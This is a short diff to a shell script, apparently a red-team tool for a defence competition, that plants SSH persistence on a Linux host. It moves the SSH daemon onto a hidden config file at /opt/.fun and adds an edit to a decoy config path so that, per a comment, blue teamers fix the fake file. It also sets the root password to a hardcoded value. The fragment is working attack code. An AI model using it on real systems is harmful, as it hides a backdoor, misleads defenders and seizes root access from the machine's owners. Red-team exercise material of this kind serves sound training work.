@@ -108,11 +108,13 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # Execute the functions
+ORIG_SSH_CONF="/etc/ssh/sshd_conf"
 NEW_SSH_CONF="/opt/.fun"
 cp /etc/ssh/sshd_config "$NEW_SSH_CONF"
 
 update_ssh_service "$NEW_SSH_CONF" "/usr/lib/systemd/system/ssh.service"
 update_ssh_config "$NEW_SSH_CONF"
+update_ssh_config "$ORIG_SSH_CONF" # Let blue teamers fix fake config
 restart_ssh_service
 
 echo "root:H4ckB4ckJ4ck" | chpasswd
